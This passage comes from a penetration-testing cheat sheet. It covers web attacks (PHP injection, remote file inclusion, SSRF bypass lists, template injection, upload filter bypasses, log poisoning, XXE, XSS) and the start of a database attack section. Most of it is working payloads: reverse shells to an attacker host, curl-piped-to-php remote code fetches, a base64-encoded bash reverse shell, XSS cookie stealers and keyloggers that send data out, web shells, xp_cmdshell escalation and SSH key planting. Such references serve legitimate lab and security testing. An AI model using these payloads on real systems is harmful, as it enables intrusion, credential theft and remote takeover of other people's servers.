Type "help", "copyright", "credits" or "license" for more information.
>>> len("/www/index.html")
15
```

```c
$ echo 'O:9:"PageModel":1:{s:4:"file";s:11:"/etc/passwd";}' | base64
Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2V0Yy9wYXNzd2QiO30K
```

#### Skeleton Payload Request

```c
GET / HTTP/1.1
Host: <RHOST>:<RPORT>
User-Agent: <?php system('cat /');?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2V0Yy9wYXNzd2QiO30K
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

### PHP eval()

#### Exploiting eval() base64 payload

```c
${system(base64_decode(b64-encoded-command))}
```

### PHP Generic Gadget Chains (PHPGGC)

> https://github.com/ambionics/phpggc

#### Dropping a File

```c
$ phpggc -u --fast-destruct Guzzle/FW1 /dev/shm/<FILE>.txt /PATH/TO/FILE/<FILE>.txt
```

### PHP Injection

#### Skeleton Payload Request

```c
POST /profilepicture.php HTTP/1.1
...
Connection: close
Cookie: PHPSESSID=bot0hfe9lt6mfjnki9ia71lk2k
Upgrade-Insecure-Requests: 1

<PAYLOAD>
```

#### Payloads

```c
url=/etc/passwd
url=file:////home/<USERNAME>/.ssh/authorized_keys
<?php print exec(ls) ?>
```

### PHP preg_replace()

#### Exploitation

> https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace

```c
pattern=/ip_address/e&ipaddress=system('id')&text="openvpn": {
```

#### Remote Code Execution

```c
POST /dirb_safe_dir_rf9EmcEIx/admin/email.php HTTP/1.1
Host: <RHOST>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 303
Origin: http://www.securewebinc.jet
DNT: 1
Connection: close
Referer: http://<RHOST>/dirb_safe_dir_rf9EmcEIx/admin/dashboard.php
Cookie: PHPSESSID=4bsdjba9nanh5nc6off028k403
Upgrade-Insecure-Requests: 1

swearwords%5B%2Ffuck%2Fi%5D=make+love&swearwords%5B%2Fshit%2Fi%5D=poop&swearwords%5B%2Fass%2Fi%5D=behind&swearwords%5B%2Fdick%2Fi%5D=penis&swearwords%5B%2Fwhore%2Fi%5D=escort&swearwords%5B%2Fasshole%2Fi%5D=bad+person&to=test%40test.de&subject=test&message=%3Cp%3Etest%3Cbr%3E%3C%2Fp%3E&_wysihtml5_mode=1
```

#### Skeleton Payload Request

```c
POST /dirb_safe_dir_rf9EmcEIx/admin/email.php?cmd=ls HTTP/1.1
Host: <RHOST>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 259
Connection: close
Referer: http://<RHOST>/dirb_safe_dir_rf9EmcEIx/admin/dashboard.php
Cookie: PHPSESSID=4bsdjba9nanh5nc6off028k403
Upgrade-Insecure-Requests: 1

swearwords[/fuck/ie]=system($_GET["cmd"])&swearwords[/shit/i]=poop&swearwords[/ass/i]=behind&swearwords[/dick/i]=penis&swearwords[/whore/i]=escort&swearwords[/asshole/i]=badperson&to=nora@example.com&subject=sdfj&message=swearwords[/fuck/]&_wysihtml5_mo
de=1
```

### PHP strcmp

#### Bypass

```c
if (!empty($_POST['username']) && !empty($_POST['password'])) {
    require('config.php');
    if (strcmp($username, $_POST['username']) == 0) {
        if (strcmp($password, $_POST['password']) == 0) {
            $_SESSION['user_id'] = 1;
            header("Location: ../upload.php");
        } else {
            print("<script>alert('Wrong Username or Password')</script>");
        }
    } else {
        print("<script>alert('Wrong Username or Password')</script>");
    }
}
```

##### Explanation

The developer is using `strcmp` to check the `username` and `password`, which is insecure and can easily be bypassed.

This is due to the fact that if `strcmp` is given an `empty array` to compare against the `stored password`, it will return `null`.

In PHP the `==` operator only checks the value of a variable for `equality`, and the value of `NULL` is equal to `0`.

The correct way to write this would be with the === operator which checks both value and type. Let's open `Burp Suite` and catch the login request.

#### Bypassing

Change `POST` data as follows to bypass the login.

```c
username[]=admin&password[]=admin
```

### PHP verb File Upload

```c
$ curl -X PUT -d '<?php system($_GET["c"]);?>' http://<RHOST>/<FILE>.php
```

## Poison Null Byte

### Error Message

`Only .md and .pdf files are allowed!`

### Example

```c
%00
```

### Bypass

```c
$ curl http://<RHOST>/ftp/package.json.bak%2500.md
```

## Remote File Inclusion (RFI)

```c
$ http://<RHOST>/PATH/TO/FILE/?page=http://<RHOST>/<FILE>.php
$ http://<RHOST>/index.php?page=' and die(system("curl http://<LHOST>/<FILE>.php|php")) or '
$ http://<RHOST>/index.php?page=%27%20and%20die(system(%22curl%20http://<LHOST>/<FILE>.php|php%22))%20or%20%27
```

### Root Cause Function

```c
allow_url_fopen
```

### Code Execution

```c
$ User-Agent: <?system('wget http://<LHOST>/<FILE>.php -O <FILE>.php');?>
$ http://<RHOST>/view.php?page=../../../../../proc/self/environ
```

### WAF Bypass

```
$ http://<RHOST>/page=http://<LHOST>/<SHELL>.php%00
$ http://<RHOST>/page=http://<LHOST>/<SHELL>.php?
```

## Server-Side Request Forgery (SSRF)

### &x=

```c
$ https://<RHOST>/item/2?server=server.<RHOST>/file?id=9&x=
```

The payload ending in `&x=` is being used to stop the remaining path from being appended to the end of the attacker's URL and instead turns it into a parameter (?x=) on the query string.

### 0-Cut Bypass

```c
http://1.1          // http://1.0.0.1
http://127.0.0.1    // http://127.1.1
http://192.168.1    // http://192.168.0.1
```

### Bypass List

```c
http://localhost
http://127.0.0.1
http://2130706433
http://0177.1
http://0x7f.1
http://127.000.000.1
http://127.0.0.1.nip .io
http://[::1]
http://[::]
Base-Url: 127.0.0.1
Client-IP: 127.0.0.1
Http-Url: 127.0.0.1
Proxy-Host: 127.0.0.1
Proxy-Url: 127.0.0.1
Real-Ip: 127.0.0.1
Redirect: 127.0.0.1
Referer: 127.0.0.1
Referrer: 127.0.0.1
Refferer: 127.0.0.1
Request-Uri: 127.0.0.1
Uri: 127.0.0.1
Url: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Forward-For: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-For-Original: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Forwarded-Port: 443
X-Forwarded-Port: 4443
X-Forwarded-Port: 80
X-Forwarded-Port: 8080
X-Forwarded-Port: 8443
X-Forwarded-Scheme: http
X-Forwarded-Scheme: https
X-Forwarded-Server: 127.0.0.1
X-Forwarded: 127.0.0.1
X-Forwarder-For: 127.0.0.1
X-Host: 127.0.0.1
X-Http-Destinationurl: 127.0.0.1
X-Http-Host-Override: 127.0.0.1
X-Original-Remote-Addr: 127.0.0.1
X-Original-Url: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Proxy-Url: 127.0.0.1
X-Real-Ip: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Rewrite-Url: 127.0.0.1
X-True-IP: 127.0.0.1
```

### Server-Side Request Forgery Mass Bypass

```c
Base-Url: 127.0.0.1
Client-IP: 127.0.0.1
Http-Url: 127.0.0.1
Proxy-Host: 127.0.0.1
Proxy-Url: 127.0.0.1
Real-Ip: 127.0.0.1
Redirect: 127.0.0.1
Referer: 127.0.0.1
Referrer: 127.0.0.1
Refferer: 127.0.0.1
Request-Uri: 127.0.0.1
Uri: 127.0.0.1
Url: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Forward-For: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-For-Original: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Forwarded-Port: 443
X-Forwarded-Port: 4443
X-Forwarded-Port: 80
X-Forwarded-Port: 8080
X-Forwarded-Port: 8443
X-Forwarded-Scheme: http
X-Forwarded-Scheme: https
X-Forwarded-Server: 127.0.0.1
X-Forwarded: 127.0.0.1
X-Forwarder-For: 127.0.0.1
X-Host: 127.0.0.1
X-Http-Destinationurl: 127.0.0.1
X-Http-Host-Override: 127.0.0.1
X-Original-Remote-Addr: 127.0.0.1
X-Original-Url: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Proxy-Url: 127.0.0.1
X-Real-Ip: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Rewrite-Url: 127.0.0.1
X-True-IP: 127.0.0.1
```

## Server-Side Template Injection (SSTI)

### Fuzz String

> https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti

```c
${{<%[%'"}}%\.
```

### Magic Payload

> https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee

```c
{{ ‘’.__class__.__mro__[1].__subclasses__() }}
```

### Jinja

```c
{{malicious()}}
```

### Jinja2

```c
</title></item>{{4*4}}
```

### Payload

```c
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Payload

```c
{{''.__class__.__base__.__subclasses__()[141].__init__.__globals__['sys'].modules['os'].popen("id").read()}}
```

### Evil Config

#### Config

```c
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }} 
```

#### Load Evil Config

```c
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}
```

#### Connect to Evil Host

```c
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"',shell=True) }}
```

#### Example

```c
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<LHOST>\",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```

## Subdomain Takeover

> https://www.youtube.com/watch?v=w4JdIgRGVrE

> https://github.com/EdOverflow/can-i-take-over-xyz

### Check manually for vulnerable Subdomains

```c
$ curl https://<DOMAIN> | egrep -i "404|GitHub Page"
```

### Responsible Vulnerability Handling

#### Example

##### GitHub Pages

###### CNAME

```c
<SUBDOMAIN>.<DOMAIN>
```

###### 2fchn734865gh234356h668j4dsrtbse9056gh405.html

```c
<!-- PoC by Red Team -->
```

## Symfony

> https://infosecwriteups.com/how-i-was-able-to-find-multiple-vulnerabilities-of-a-symfony-web-framework-web-application-2b82cd5de144

### Enumeration

```c
http://<RHOST>/_profiler
http://<RHOST>/app_dev.php/_profiler
http://<RHOST>/app_dev.php
http://<RHOST>/app_dev.php/_profiler/phpinfo
http://<RHOST>/app_dev.php/_profiler/open?file=app/config/parameters.yml
```

### Exploit

> https://github.com/ambionics/symfony-exploits

```c
$ python3 secret_fragment_exploit.py 'http://<RHOST>/_fragment' --method 2 --secret '48a8538e6260789558f0dfe29861c05b' --algo 'sha256' --internal-url 'http://<RHOST>/_fragment' --function system --parameters 'id'
```

## unfurl

> https://github.com/tomnomnom/unfurl

```c
$ go install github.com/tomnomnom/unfurl@latest
```

## Upload Filter Bypass

### Java Server Pages (JSP) Filter Bypass

```c
.MF
.jspx
.jspf
.jsw
.jsv
.xml
.war
.jsp
.aspx
```

### PHP Filter Bypass

```c
.sh
.cgi
.inc
.txt
.pht
.phtml
.phP
.Php
.php3
.php4
.php5
.php7
.pht
.phps
.phar
.phpt
.pgif
.phtml
.phtm
.php%00.jpeg
```

### Content-Types

```c
Content-Type : image/gif
Content-Type : image/png
Content-Type : image/jpeg
```

### Examples

#### Null Bytes

```c
$ mv <FILE>.jpg <FILE>.php\x00.jpg
```

#### More Bypass Examples

```c
<FILE>.php%20
<FILE>.php%0d%0a.jpg
<FILE>.php%0a
<FILE>.php.jpg
<FILE>.php%00.gif
<FILE>.php\x00.gif
<FILE>.php%00.png
<FILE>.php\x00.png
<FILE>.php%00.jpg
<FILE>.php\x00.jpg
```

## Upload Vulnerabilities

```c
ASP / ASPX / PHP / PHP3 / PHP5: Webshell / Remote Code Execution
SVG: Stored XSS / Server-Side Request Forgery
GIF: Stored XSS
CSV: CSV Injection
XML: XXE
AVI: Local File Inclusion / Server-Side request Forgery
HTML/JS: HTML Injection / XSS / Open Redirect
PNG / JPEG: Pixel Flood Attack
ZIP: Remote Code Exection via Local File Inclusion
PDF / PPTX: Server-Side Request Forgery / Blind XXE
```

## waybackurls

> https://github.com/tomnomnom/waybackurls

```c
$ go install github.com/tomnomnom/waybackurls@latest
```

## Web Log Poisoning

### Web Shell

```c
$ nc <RHOST> 80
```

```c
GET /<?php echo shell_exec($_GET['cmd']); ?> HTTP/1.1
Host: <RHOST>
Connection: close
```

```c
http://<RHOST>/view.php?page=../../../../../var/log/nginx/access.log&cmd=id
```

### Code Execution

```c
$ nc <RHOST> 80
```

```c
GET /<?php passthru('id'); ?> HTTP/1.1
Host: <RHOST>
Connection: close
```

```c
http://<RHOST>/view.php?page=../../../../../var/log/nginx/access.log
```

## Wfuzz

> https://github.com/xmendez/wfuzz

```c
$ wfuzz -w /usr/share/wfuzz/wordlist/general/big.txt -u http://<RHOST>/FUZZ/<FILE>.php --hc '403,404'
```

### Write to File

```c
$ wfuzz -w /PATH/TO/WORDLIST -c -f <FILE> -u http://<RHOST> --hc 403,404
```

### Custom Scan with limited Output

```c
$ wfuzz -w /PATH/TO/WORDLIST -u http://<RHOST>/dev/304c0c90fbc6520610abbf378e2339d1/db/file_FUZZ.txt --sc 200 -t 20
```

### Fuzzing two Parameters at once

```c
$ wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://<RHOST>:/<directory>/FUZZ.FUZ2Z -z list,txt-php --hc 403,404 -c
```

### Domain

```c
$ wfuzz --hh 0 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.<RHOST>' -u http://<RHOST>/
```

### Subdomain

```c
$ wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.<RHOST>" --hc 200 --hw 356 -t 100 <RHOST>
```

### Git

```c
$ wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -u http://<RHOST>/FUZZ --hc 403,404
```
### Login

```c
$ wfuzz -c -z file,usernames.txt -z file,passwords.txt -u http://<RHOST>/login.php -d "username=FUZZ&password=FUZ2Z" --hs "Login failed!"
$ wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "email=FUZZ&password=<PASSWORD>" -w /PATH/TO/WORDLIST/<WORDLIST>.txt --hc 200 -c
$ wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "username=FUZZ&password=<PASSWORD>" -w /PATH/TO/WORDLIST/<WORDLIST>.txt --ss "Invalid login"
```

### SQL

```c
$ wfuzz -c -z file,/usr/share/wordlists/seclists/Fuzzing/SQLi/Generic-SQLi.txt -d 'db=FUZZ' --hl 16 http://<RHOST>/select http
```

### DNS

```c
$ wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Origin: http://FUZZ.<RHOST>" --filter "r.headers.response~'Access-Control-Allow-Origin'" http://<RHOST>/
$ wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,404,403 -H "Host: FUZZ.<RHOST>" -u http://<RHOST> -t 100
$ wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,403,404 -H "Host: FUZZ.<RHOST>" -u http://<RHOST> --hw <value> -t 100
```

### Numbering Files

```c
$ wfuzz -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt --hw 31 http://10.13.37.11/backups/backup_2021052315FUZZ.zip
```

### Enumerating PIDs

```c
$ wfuzz -u 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline' -z range,900-1000
```

## WhatWeb

> https://github.com/urbanadventurer/WhatWeb

```c
$ whatweb -v -a 3 <RHOST>
```

## Wordpress

### Config Path

```c
/var/www/wordpress/wp-config.php
```

## WPScan

```c
$ wpscan --url https://<RHOST> --enumerate u,t,p
$ wpscan --url https://<RHOST> --plugins-detection aggressive
$ wpscan --url https://<RHOST> --disable-tls-checks
$ wpscan --url https://<RHOST> --disable-tls-checks --enumerate u,t,p
$ wpscan --url http://<RHOST> -U <USERNAME> -P passwords.txt -t 50
```

## XML External Entity (XXE)

### Prequesites

Possible JSON Implementation

### Skeleton Payload Request

```c
GET / HTTP/1.1
Host: <RHOST>:<RPORT>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Length: 136

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://<LHOST>:80/shell.php" >]>
<foo>&xxe;</foo>
```

### Payloads

```c
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE xxe [ <!ENTITY passwd SYSTEM 'file:///etc/passwd'> ]>
 <stockCheck><productId>&passwd;</productId><storeId>1</storeId></stockCheck>
```

```c
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]><order><quantity>3</quantity><item>&test;</item><address>17th Estate, CA</address></order>
```

```c
username=%26username%3b&version=1.0.0--><!DOCTYPE+username+[+<!ENTITY+username+SYSTEM+"/root/.ssh/id_rsa">+]><!--
```

```c
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\
x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMC85MDAxIDA+JjEK | base64 -d | b
ash")["read"]() %} a {% endwith %}
```

## XSRFProbe (Cross-Site Request Forgery / CSRF / XSRF)

> https://github.com/0xInfection/XSRFProbe

```c
$ xsrfprobe -u https://<RHOST> --crawl --display
```

## Cross-Site Scripting (XSS)

aka JavaScript Injection.

```c
<sCrIpt>alert(1)</ScRipt>
<script>alert('XSS');</script>
<script>alert(document.cookies)</script>
<script>document.querySelector('#foobar-title').textContent = '<TEXT>'</script>
<script>fetch('https://<RHOST>/steal?cookie=' + btoa(document.cookie));</script>
<script>user.changeEmail('user@domain');</script>
</script><svg/onload=alert(0)>
<iframe src=file:///etc/passwd height=1000px width=1000px></iframe>
<img src='http://<RHOST>'/>
```

### Reflected XSS

```c
<script>alert('XSS');</script>
<script>alert(document.cookies)</script>
```

### Reflected XSS at Scale

```c
$ subfinder -d <RHOST> -silent -all | httpx -silent | nuclei -tags xss -exclude-severity info -rl 20 -c 10 -o /PATH/TO/FILE/<FILE>
```

### Stored XSS

```c
<script>document.querySelector('#foobar-title').textContent = '<TEXT>'</script>
```

### Session Stealing

```c
<script>fetch('https://<RHOST>/steal?cookie=' + btoa(document.cookie));</script>
```

### Key Logger

```c
<script>document.onkeypress = function(e) { fetch('https://<RHOST>/log?key=' + btoa(e.key) );}</script>
```

### Business Logic

JavaScript is calling `user.changeEmail()`. This can be abused.

```c
<script>user.changeEmail('user@domain');</script>
```

### Polyglot

```c
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

### Single XSS Vector

```c
JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
```

### DOM-XSS

#### Main sinks that can lead to DOM-XSS Vulnerabilities

```c
## document.write()
## document.writeln()
## document.domain
## someDOMElement.innerHTML
## someDOMElement.outerHTML
## someDOMElement.insertAdjacentHTML
## someDOMElement.onevent
```

### jQuery Function sinks that can lead to DOM-XSS Vulnerabilities

```c
## add()
## after()
## append()
## animate()
## insertAfter()
## insertBefore()
## before()
## html()
## prepend()
## replaceAll()
## replaceWith()
## wrap()
## wrapInner()
## wrapAll()
## has()
## constructor()
## init()
## index()
## jQuery.parseHTML()
## $.parseHTML()
```

### Skeleton Payload Request

```c
POST /blog-single.php HTTP/1.1
Host: <RHOST>
User-Agent: <script src="http://<LHOST>:<LPORT>/test.html"></script>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 126
Origin: http://<RHOST>
DNT: 1
Connection: close
Referer: http://<RHOST>/blog.php
Upgrade-Insecure-Requests: 1

name=test&email=test%40test.de&phone=1234567890&message=<script
src="http://<LHOST>:<LPORT>/test.html"></script>&submit=submit
```

### XSS POST Request

#### XSS post request on behalf of the Victim, with custom Cookies.

```c
var xhr = new XMLHttpRequest();
document.cookie = "key=value;";
var uri ="<target_uri>";
xhr = new XMLHttpRequest();
xhr.open("POST", uri, true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("<post_body>");
```

### XSS Web Request

#### XSS web Request on behalf of Victim and sends back the complete Webpage.

```c
xmlhttp = new XMLHttpRequest();
xmlhttp.onload = function() {
  x = new XMLHttpRequest();
  x.open("GET", '<local_url>?'+xmlhttp.response);
  x.send(null);
}
xmlhttp.open("GET", '<RHOST>');
xmlhttp.send(null);
```




# Database Assessment

- [Resources](#resources)

## Table of Contents

- [Hibernate Query Language Injection (HQLi)](#hibernate-query-language-injection-hqli)
- [impacket-mssqlclient](#impacket-mssqlclient)
- [MongoDB](#mongodb)
- [MDB Tools](#mdb-tools)
- [MSSQL](#mssql)
- [MySQL](#mysql)
- [mysqldump](#mysqldump)
- [NoSQL Injection](#nosql-injection)
- [PostgreSQL](#postgresql)
- [Redis](#redis)
- [SQL](#sql)
- [sqlcmd](#sqlcmd)
- [SQL Injection](#sql-injection-sqli)
- [sqlite3](#sqlite3)
- [sqlmap](#sqlmap)
- [sqlmap Websocket Proxy](#sqlmap-websocket-proxy)
- [sqsh](#sqsh)
- [XPATH Injection](#xpath-injection)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| Advanced SQL Injection Cheatsheet | A cheat sheet that contains advanced queries for SQL Injection of all types. | https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet |
| Cypher Injection Cheat Sheet | n/a | https://pentester.land/blog/cypher-injection-cheatsheet/#cypher-queries |
| NoSQLMap | NoSQLMap is an open source Python tool designed to audit for as well as automate injection attacks and exploit default configuration weaknesses in NoSQL databases and web applications using NoSQL in order to disclose or clone data from the database. | https://github.com/codingo/NoSQLMap |
| RedisModules-ExecuteCommand | Tools, utilities and scripts to help you write redis modules! | https://github.com/n0b0dyCN/RedisModules-ExecuteCommand |
| Redis RCE | Redis 4.x/5.x RCE | https://github.com/Ridter/redis-rce |
| Redis Rogue Server | Redis(<=5.0.5) RCE | https://github.com/n0b0dyCN/redis-rogue-server |
| SQL injection cheat sheet | This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks. | https://portswigger.net/web-security/sql-injection/cheat-sheet |
| SQL Injection Payload List | SQL Injection Payload List | https://github.com/payloadbox/sql-injection-payload-list |
| sqlmap | sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. | https://github.com/sqlmapproject/sqlmap |
| sqlmap Websocket Proxy | Tool to enable blind sql injection attacks against websockets using sqlmap | https://github.com/BKreisel/sqlmap-websocket-proxy |

## Hibernate Query Language Injection (HQLi)

```c
uid=x' OR SUBSTRING(username,1,1)='m' and ''='&auth_primary=x&auth_secondary=962f4a03aa7ebc0515734cf398b0ccd6
```

## impacket-mssqlclient

> https://github.com/fortra/impacket

### Common Commands

```c
SQL> enum_logins
SQL> enum_impersonate
```

### Connection

```c
$ impacket-mssqlclient <USERNAME>@<RHOST>
$ impacket-mssqlclient <USERNAME>@<RHOST> -windows-auth
$ sudo mssqlclient.py <RHOST>/<USERNAME>:<USERNAME>@<RHOST> -windows-auth
```

```c
$ export KRB5CCNAME=<USERNAME>.ccache
$ impacket-mssqlclient -k <RHOST>.<DOMAIN>
```

### Privilege Escalation

```c
SQL> exec_as_login sa
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

## MongoDB

### Client Installation

```c
$ sudo apt-get install mongodb-clients
```

### Usage

```c
$ mongo "mongodb://localhost:27017"
```

### Common Commands

```c
> use <DATABASE>;
> show tables;
> show collections;
> db.system.keys.find();
> db.users.find();
> db.getUsers();
> db.getUsers({showCredentials: true});
> db.accounts.find();
> db.accounts.find().pretty();
> use admin;
```

### User Password Reset to "12345"

```c
> db.getCollection('users').update({username:"admin"}, { $set: {"services" : { "password" : {"bcrypt" : "$2a$10$n9CM8OgInDlwpvjLKLPML.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG" } } } })
```

## MDB Tools

> https://github.com/mdbtools/mdbtools

```c
=> list tables     // show tables
=> go              // executes commands
```

```c
$ mdb-sql <FILE>
```

## MSSQL

### Connection

```c
$ sqlcmd -S <RHOST> -U <USERNAME> -P '<PASSWORD>'
```

### Show Database Content

```c
1> SELECT name FROM master.sys.databases
2> go
```

### OPENQUERY

```c
1> select * from openquery("web\clients", 'select name from master.sys.databases');
2> go
```

```c
1> select * from openquery("web\clients", 'select name from clients.sys.objects');
2> go
```

### Binary Extraction as Base64

```c
1> select cast((select content from openquery([web\clients], 'select * from clients.sys.assembly_files') where assembly_id = 65536) as varbinary(max)) for xml path(''), binary base64;
2> go > export.txt
```

### Steal NetNTLM Hash / Relay Attack

```c
SQL> exec master.dbo.xp_dirtree '\\<LHOST>\FOOBAR'
```

## mssqlclient.py

### Common Commands

```c
SQL> enum_logins
SQL> enum_impersonate
```

### Connection

```c
$ sudo mssqlclient.py <RHOST>/<USERNAME>:<USERNAME>@<RHOST> -windows-auth
```

### Privilege Escalation

```c
SQL> exec_as_login sa
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

## MySQL

> https://www.mysqltutorial.org/mysql-cheat-sheet.aspx

```c
$ mysql -u root -p
$ mysql -u <USERNAME> -h <RHOST> -p
```

### Common Commands

```c
mysql> STATUS;
mysql> SHOW databases;
mysql> USE <DATABASE>;
mysql> SHOW tables;
mysql> DESCRIBE <TABLE>;
mysql> SELECT * FROM Users;
mysql> SELECT * FROM users \G;
mysql> SELECT Username,Password FROM Users;
mysql> SHOW GRANTS FOR '<USERNAME>'@'localhost' \G;
```

### Enumerate Version

```c
$ mysql -u root -p -e 'select @@version;'
```

### Password Reset

```c
$ sudo systemctl stop mysql.service
$ sudo mysqld_safe --skip-grant-tables &
$ mysql -uroot
$ use mysql;
$ update user set authentication_string=PASSWORD("mynewpassword") where User='root';
$ flush privileges;
$ quit
$ sudo systemctl start mysql.service
```

> https://bcrypt-generator.com/

```c
mysql> UPDATE user SET password = '37b08599d3f323491a66feabbb5b26af' where user_id = 1;
mysql> UPDATE users SET password = '$2a$12$QvOBZ0r4tDdDCib4p8RKGudMk0VZKWBX21Dxh292NwrXwzwiuRIoG';
```

### Update User Privileges

```c
mysql> UPDATE user set is_admin = 1 where name = "<USERNAME>";
```

### Base64 Encoding

```c
mysql> SELECT TO_BASE64(password) FROM accounts where id = 1;
```

### Read a File

```c
mysql> SELECT LOAD_FILE('/etc/passwd');
mysql> SELECT CAST(LOAD_FILE('/etc/passwd') AS CHAR)\G;
```

### User Privilege Check

```c
mysql> SELECT group_concat(grantee, ":",privilege_type) FROM information_schema.user_privileges
```

### File Privilege Check

```c
mysql> SELECT file_priv FROM mysql.user WHERE user = 'netspi'
mysql> SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'file' AND grantee LIKE '%netspi%'
```

### Drop a Shell

```c
mysql> \! sh;
mysql> \! /bin/sh;
```

### Insert Code to get executed

```c
mysql> insert into users (id, email) values (<LPORT>, "- E $(bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1')");
```

### Write SSH Key into authorized_keys2 file

```c
mysql> SELECT "<KEY>" INTO OUTFILE '/root/.ssh/authorized_keys2' FIELDS TERMINATED BY '' OPTIONALLY ENCLOSED BY '' LINES TERMINATED BY '\n';
```

### Create Database

```c
MariaDB [(none)]> CREATE DATABASE <DATABASE>;
Query OK, 1 row affected (0.001 sec)

MariaDB [(none)]> INSERT INTO mysql.user (User,Host,authentication_string,SSL_cipher,x509_issuer,x509_subject)
    -> VALUES('<USERNAME>','%',PASSWORD('<PASSWORD>'),'','','');
Query OK, 1 row affected (0.001 sec)

MariaDB [(none)]> FLUSH PRIVILEGES;
Query OK, 0 rows affected (0.000 sec)

